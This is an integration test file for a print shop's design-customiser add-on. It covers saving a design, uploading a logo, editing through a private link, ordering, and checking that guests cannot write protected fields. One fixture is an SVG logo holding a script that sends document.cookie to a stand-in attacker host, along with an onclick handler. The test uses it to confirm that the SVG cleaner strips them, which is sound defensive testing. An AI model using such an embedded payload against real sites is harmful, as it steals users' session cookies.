// SPDX-License-Identifier: AGPL-3.0-only
/**
 * A CUSTOMER'S DESIGN IN THE CUSTOMISER AS IT IS BUILT: SAVED, GIVEN A LOGO,
 * CHANGED, FOUND AGAIN BY ITS CODE, AND KEPT ONCE IT IS ORDERED.
 *
 * The Customiser is taken from a checkout of the add-ons repository, built
 * (`ADMINIUM_ADD_ONS_REPO`, `npm run build` in `packages/customiser`): its
 * manifest as it ships, installed beside a print shop that requires it, on
 * each engine this run reaches. A guest of the shop:
 *
 * - saves a design through the shop's key, with a photo uploaded for it, and
 *   is handed the design's own link once, with a session on the add-on's
 *   link key;
 * - uploads a logo through `/api/v1/public/uploads` with that session, and
 *   attaches it while changing the draft through the link: one design, one
 *   code, the logo kept only as Adminium cleans an SVG, and handed back to
 *   the link as a download;
 * - orders it, finds the order again, and reads the design by the code the
 *   order line holds, never seeing the code or the link's secret;
 * - cannot change it once it is ordered, nor write what the link does not
 *   name (the address, the state, the app, the codes).
 *
 * Without the checkout the suite is skipped, by name.
 */
import { publicKeysRepo } from '@adminium/meta';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';

import { cleanSvg } from '../src/files/svg.js';
import { solveProof } from '../src/public-api/proof.js';
import { builtAddOn } from './add-ons/harness.js';
import { addOnHarness, type Harness } from './app-add-ons.helpers.js';
import { LEGS } from './invoicing-install.helpers.js';
import { png } from './picture-images.js';
import { servePublic, type Served } from './public-lane.helpers.js';

type Reply = Awaited<ReturnType<Served['get']>>;
type Doc = Record<string, unknown>;

const CUSTOMISER = 'customiser';
const LINK_KEY = 'customiser-link';
const DESIGNS = 'customiser_designs';
const OWN = 'customiser_designs_claimed';
const BY_CODE = 'customiser_designs_unlocked';
const built = builtAddOn(CUSTOMISER);
const FLOOR = '0.3.43';
const pk = { ref: 'id', type: 'int', role: 'pk' } as const;
const EMAIL = 'guest@example.com';
const WORDS = { parts: { words: { text: 'Harbour Bakery' } } };
/** A logo as a drawing program saves it: a script and a click handler inside; cleaned, the drawing alone. */
const LOGO_SVG = Buffer.from(
  '<?xml version="1.0" encoding="UTF-8"?>\n<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">\n  <script>fetch("https://evil.example/" + document.cookie)</script>\n  <rect width="10" height="10" fill="#c00" onclick="alert(1)"/>\n</svg>\n',
  'utf8',
);

/** A print shop whose order lines name a customer's design by its code, and whose guests find their order again by its number and code. */
function printShop(): Doc {
  return {
    manifestVersion: 1,
    publisher: { id: 'adminium', name: 'Adminium' },
    license: 'MIT',
    kind: 'app',
    key: 'printing',
    name: 'Print shop',
    version: '1.0.0',
    description: { key: 'mft.printing.desc', fallback: 'A shop.' },
    categories: ['commerce'],
    compatibility: { minAdminiumVersion: FLOOR, engines: ['postgres', 'mysql', 'sqlite'] },
    requiredSchema: {
      prefixed: true,
      tables: [
        { ref: 'products', columns: [pk, { ref: 'name', type: 'text', maxLength: 80, nullable: true }, { ref: 'price', type: 'decimal', scale: 2, default: 0 }] },
        {
          ref: 'orders',
          columns: [
            pk,
            { ref: 'name', type: 'text', maxLength: 80, nullable: true },
            { ref: 'email', type: 'text', maxLength: 120, nullable: true },
            { ref: 'link_code', type: 'text', maxLength: 12, nullable: true, rules: { code: { length: 12 } } },
          ],
        },
        {
          ref: 'order_lines',
          columns: [
            pk,
            { ref: 'order_id', type: 'fk', references: 'orders' },
            { ref: 'product_id', type: 'fk', references: 'products', nullable: true },
            { ref: 'qty', type: 'int', default: 1 },
            { ref: 'design_code', type: 'text', maxLength: 40, nullable: true },
            {
              ref: 'design_id',
              type: 'int',
              nullable: true,
              rules: {
                addOnLink: { addOn: CUSTOMISER, table: 'designs' },
                lookup: { from: 'design_code', table: { addOn: CUSTOMISER, table: 'designs' }, column: 'code' },
              },
            },
          ],
        },
      ],
    },
    pages: [{ ref: 'printing-home', template: 'page-dashboard', title: { key: 'mft.printing.page.home', fallback: 'Home' }, nav: { group: 'manifest:sample', icon: 'layout-dashboard', order: 1 } }],
    frontends: [
      { side: 'staff', kind: 'spa', entry: 'index.html', routes: { desk: '/' } },
      { side: 'customer', kind: 'spa', entry: 'index.html', routes: { shop: '/' } },
    ],
    addOns: { requires: [{ key: CUSTOMISER, range: '^1.0.0', reason: { 'en-US': 'Customers make their cards their own.' } }] },
    publicAccess: [
      { table: 'products', methods: ['GET'], select: ['id', 'name', 'price'] },
      {
        table: 'orders',
        methods: ['POST'],
        writable: ['name', 'email'],
        humanCheck: true,
        select: ['id'],
        children: { order_lines: { via: 'order_id', writable: ['product_id', 'qty', 'design_code'], select: ['id', 'design_id'], min: 1, max: 12 } },
      },
      { table: 'orders', methods: ['GET'], claim: { match: ['id', 'link_code'] }, select: ['id', 'name'] },
      { table: 'order_lines', methods: ['GET'], select: ['id', 'qty', 'design_code'], visibleWith: { table: 'orders', via: 'order_id' } },
    ],
  };
}

describe.each(LEGS)("a customer's design in the built Customiser, from saved to ordered — %s", (dialect, available) => {
  const runs = available && built !== null;
  let h: Harness;
  let served: Served;
  let door: Served;
  let ip = 0;
  const fresh = () => {
    ip += 1;
    return `10.9.${String((ip >> 8) & 255)}.${String(ip & 255)}`;
  };
  const proof = async (purpose: 'upload' | 'write', address: string) => {
    const res = await served.composed.app.inject({ method: 'GET', url: `/api/v1/public/challenge?purpose=${purpose}`, remoteAddress: address, headers: served.headers() });
    const c = (res.json() as { data: { id: string; salt: string; difficulty: number } }).data;
    return `${c.id}.${solveProof(c.salt, c.difficulty)}`;
  };
  /** A create behind the human check, through the shop's key, as a browser sends one. */
  const create = async (ref: string, payload: Doc) => {
    const address = fresh();
    const headers = served.headers(undefined, { 'x-adminium-proof': await proof('write', address) });
    return served.composed.app.inject({ method: 'POST', url: `/api/v1/public/records/${ref}`, remoteAddress: address, headers, payload });
  };
  /** One file sent as a page sends it, the body the file: through the link with its session, or through the shop's key with a proof. */
  const upload = async (through: Served, at: string, column: string, body: Buffer, opts: { session?: string | undefined; name: string; type: string }) => {
    const address = fresh();
    const extra = opts.session === undefined ? { 'x-adminium-proof': await proof('upload', address) } : {};
    return through.composed.app.inject({
      method: 'POST',
      url: `/api/v1/public/uploads?${new URLSearchParams({ ref: at, column, name: opts.name }).toString()}`,
      remoteAddress: address,
      headers: through.headers(opts.session, { 'content-type': opts.type, ...extra }),
      payload: body,
    });
  };
  const uploaded = async (...args: Parameters<typeof upload>): Promise<string> => {
    const res = await upload(...args);
    expect(res.statusCode, res.body).toBe(200);
    return (res.json() as { data: { id: string } }).data.id;
  };
  /** A change through the design's own link, with the session it opened. */
  const change = (id: number, values: Doc, session: string) =>
    door.composed.app.inject({ method: 'PATCH', url: `/api/v1/public/records/${OWN}/${String(id)}`, remoteAddress: fresh(), headers: door.headers(session), payload: { values } });
  const rows = (res: Reply) => (res.json() as { data: Doc[] }).data;
  const json = (value: unknown): unknown => (typeof value === 'string' ? JSON.parse(value) : value);
  /** `values` and `state` are words SQL keeps for itself: each is named in the engine's quotes. */
  const q = (name: string) => (dialect === 'mysql' ? `\`${name}\`` : `"${name}"`);
  const stored = async (id: number) =>
    (await h.rows(`SELECT id, app, code, email, logo_file, photo_file, ${q('state')} AS state, ${q('values')} AS words FROM customiser_designs WHERE id = ${String(id)}`))[0]!;
  const count = async () => Number((await h.rows('SELECT COUNT(*) AS n FROM customiser_designs'))[0]!['n']);

  /** A design saved through the shop's key: its id, its code, and the own link the save answered with. */
  const save = async (extra: Doc = {}) => {
    const res = await create(DESIGNS, { values: { format: 1, ready_design_id: 1, base_id: 1, values: WORDS, email: EMAIL, ...extra } });
    expect(res.statusCode, res.body).toBe(201);
    const body = res.json() as { data: { id: unknown; code: string }; link?: { key: string; token: string; session?: string } };
    expect(body.link, res.body).toBeDefined();
    return { id: Number(body.data.id), code: body.data.code, link: body.link!, body: res.body };
  };
  /** An order whose one line names the design by its code, and the session finding it again opens. */
  const orderFor = async (code: string) => {
    const res = await create('printing_orders', { values: { name: 'Guest', email: EMAIL }, children: { order_lines: [{ values: { product_id: 1, qty: 1, design_code: code } }] } });
    expect(res.statusCode, res.body).toBe(201);
    const id = Number((res.json() as { data: { id: unknown } }).data.id);
    const linkCode = String((await h.rows(`SELECT link_code FROM printing_orders WHERE id = ${String(id)}`))[0]!['link_code']);
    const claim = await served.composed.app.inject({ method: 'POST', url: '/api/v1/public/claim', remoteAddress: fresh(), headers: served.headers(), payload: { match: { id, link_code: linkCode } } });
    expect(claim.statusCode, claim.body).toBe(200);
    return { id, session: (claim.json() as { data: { session: string } }).data.session };
  };
  const byCode = (code: string, session?: string) =>
    served.composed.app.inject({ method: 'GET', url: `/api/v1/public/records/${BY_CODE}`, remoteAddress: fresh(), headers: served.headers(session, { 'x-adminium-code': code }) });

  beforeAll(async () => {
    if (!runs) return;
    h = await addOnHarness(dialect, { unbuiltWords: {} });
    await h.stageAddOn(built!.manifest, { files: built!.files });
    await h.stageApp(printShop());
    const installed = await h.install('printing', '1.0.0', { addOns: [{ key: CUSTOMISER, version: built!.version }], publicAccess: true });
    expect(installed.statusCode, installed.body).toBe(200);
    const key = (installed.json() as { publicAccess: { keyId: string } }).publicAccess.keyId;
    await h.rows(`INSERT INTO customiser_bases (id, app, name, kind, width_mm, height_mm, sides, ${q('state')}, position) VALUES (1, 'printing', 'Business cards', 'page', 85, 55, 2, 'published', 1)`);
    await h.rows(`INSERT INTO customiser_ready_designs (id, app, base_id, name, ${q('state')}, position) VALUES (1, 'printing', 1, 'Plain', 'published', 1)`);
    await h.rows(`INSERT INTO printing_products (id, name, price) VALUES (1, 'Cards', 10)`);
    const link = (await publicKeysRepo(h.meta).listManagedBy(CUSTOMISER)).find((one) => one.purpose === LINK_KEY && one.revokedAt === null);
    expect(link, 'the Customiser has a link key of its own').toBeDefined();
    served = await servePublic(h as never, key, { ADMINIUM_DATA_DIR: h.dataDir });
    door = await servePublic(h as never, link!.id, { ADMINIUM_DATA_DIR: h.dataDir });
  }, 240_000);
  afterAll(async () => {
    if (!runs) return;
    await door?.close();
    await served?.close();
    await h?.close();
  });

  it.skipIf(!runs)('a guest saves a design with a photo, gets its own link once, uploads a logo, attaches it while changing the draft, and reads it back', async () => {
    // The photo goes up first, through the shop's key, with a proof: nobody is signed in yet.
    const photo = png({ width: 4, height: 4 });
    const photoId = await uploaded(served, DESIGNS, 'photo_file', photo.bytes, { name: 'shop.png', type: 'image/png' });
    const saved = await save({ photo_file: photoId });
    expect(saved.link).toMatchObject({ key: LINK_KEY, session: expect.any(String) });
    expect(saved.link.token).toMatch(/^[0-9A-Z]{16}$/);
    expect(saved.code).toMatch(/^[0-9A-Z]{16}$/);
    expect(await stored(saved.id)).toMatchObject({ app: 'printing', state: 'draft', email: EMAIL });
    expect((await stored(saved.id))['photo_file']).toEqual(expect.any(String));
    const before = await count();
    // As if saved long ago: a change starts the 90 days again.
    await h.rows(`UPDATE customiser_designs SET updated_at = '2026-01-01 10:00:00' WHERE id = ${String(saved.id)}`);

    // The logo, through the link with its session (no proof), then named in a change of the draft.
    const logoId = await uploaded(door, OWN, 'logo_file', LOGO_SVG, { session: saved.link.session, name: 'logo.svg', type: 'image/svg+xml' });
    const words = { parts: { words: { text: 'Harbour Bakery & Café' }, logo: { file: 'logo_file' } } };
    const changed = await change(saved.id, { values: words, logo_file: logoId }, saved.link.session!);
    expect(changed.statusCode, changed.body).toBe(200);
    // One design, one code: changed in place.
    expect(await count()).toBe(before);
    const row = await stored(saved.id);
    expect(row).toMatchObject({ code: saved.code, app: 'printing', state: 'draft', email: EMAIL });
    expect(json(row['words'])).toEqual(words);
    expect(row['logo_file']).toEqual(expect.any(String));
    const changedAt = (await h.rows(`SELECT updated_at FROM customiser_designs WHERE id = ${String(saved.id)}`))[0]!['updated_at'];
    // The change stamped its moment: the design's 90 days count from now.
    expect(String(changedAt instanceof Date ? changedAt.toISOString() : changedAt)).not.toContain('2026-01-01');

    // Read back through the link: the words, and the logo as a download of the drawing alone.
    const opened = await door.get(`/records/${OWN}`, saved.link.session);
    expect(opened.statusCode, opened.body).toBe(200);
    expect(rows(opened).map((one) => Number(one['id']))).toEqual([saved.id]);
    expect(json(rows(opened)[0]!['values'])).toEqual(words);
    expect(rows(opened)[0]).not.toHaveProperty('email');
    expect(rows(opened)[0]).not.toHaveProperty('link_token');
    const logo = await door.get(`/files/${OWN}/${String(saved.id)}/logo_file`, saved.link.session);
    expect(logo.statusCode, logo.body).toBe(200);
    expect(logo.rawPayload.equals(cleanSvg(LOGO_SVG))).toBe(true);
    expect(logo.body).not.toContain('<script');
    expect(String(logo.headers['content-disposition'])).toMatch(/^attachment/);
    // The mailed link opens the same design from another device.
    expect((await door.post('/claim/token', { token: saved.link.token })).statusCode).toBe(200);
  });

  it.skipIf(!runs)('the link writes only what it names: never the address, the state, the app or the codes', async () => {
    const saved = await save();
    for (const values of [{ email: 'someone@example.com' }, { state: 'ordered' }, { app: 'maker' }, { code: 'AAAABBBBCCCCDDDD' }, { link_token: 'AAAABBBBCCCCDDDD' }]) {
      const res = await change(saved.id, values, saved.link.session!);
      expect(res.statusCode, `${JSON.stringify(values)}: ${res.body}`).toBe(400);
    }
    expect(await stored(saved.id)).toMatchObject({ code: saved.code, app: 'printing', state: 'draft', email: EMAIL });
  });

  it.skipIf(!runs)('after finding the order, the guest reads the design by the code its line holds; nobody else does', async () => {
    const saved = await save();
    // Nobody the shop signed in: nothing.
    expect((await byCode(saved.code)).statusCode).toBe(404);
    const order = await orderFor(saved.code);
    const lines = await served.get('/records/printing_order_lines_claimed', order.session);
    expect(lines.statusCode, lines.body).toBe(200);
    expect(rows(lines).map((line) => line['design_code'])).toEqual([saved.code]);
    const opened = await byCode(saved.code, order.session);
    expect(opened.statusCode, opened.body).toBe(200);
    expect(rows(opened).map((one) => Number(one['id']))).toEqual([saved.id]);
    expect(json(rows(opened)[0]!['values'])).toEqual(WORDS);
    // The code is never shown back, nor the link's secret, nor the address.
    expect(opened.body).not.toContain(saved.code);
    expect(opened.body).not.toContain(saved.link.token);
    expect(opened.body).not.toContain(EMAIL);
    // A wrong code, with the session: nothing.
    expect(rows(await byCode('ZZZZZZZZZZZZZZZZ', order.session))).toEqual([]);
  });

  it.skipIf(!runs)('once ordered, the design still reads through its link and is never changed by it', async () => {
    const saved = await save();
    await orderFor(saved.code);
    // What the app's order does to the design: it is the order's now.
    await h.rows(`UPDATE customiser_designs SET ${q('state')} = 'ordered' WHERE id = ${String(saved.id)}`);
    const res = await change(saved.id, { values: { parts: { words: { text: 'Changed after paying' } } } }, saved.link.session!);
    expect(res.statusCode, res.body).toBeGreaterThanOrEqual(400);
    expect(json((await stored(saved.id))['words'])).toEqual(WORDS);
    // Nor given a new logo: refused at the upload, or at the change that names it.
    const sent = await upload(door, OWN, 'logo_file', LOGO_SVG, { session: saved.link.session, name: 'logo.svg', type: 'image/svg+xml' });
    if (sent.statusCode === 200) {
      const logoId = (sent.json() as { data: { id: string } }).data.id;
      expect((await change(saved.id, { logo_file: logoId }, saved.link.session!)).statusCode).toBeGreaterThanOrEqual(400);
    } else expect(sent.statusCode, sent.body).toBeGreaterThanOrEqual(400);
    expect((await stored(saved.id))['logo_file'] ?? null).toBeNull();
    expect(rows(await door.get(`/records/${OWN}`, saved.link.session)).map((one) => one['state'])).toEqual(['ordered']);
  });

  it.skipIf(built !== null)('is skipped: no built Customiser (set ADMINIUM_ADD_ONS_REPO and run `npm run build` in packages/customiser)', () => {
    expect(built).toBeNull();
  });
});
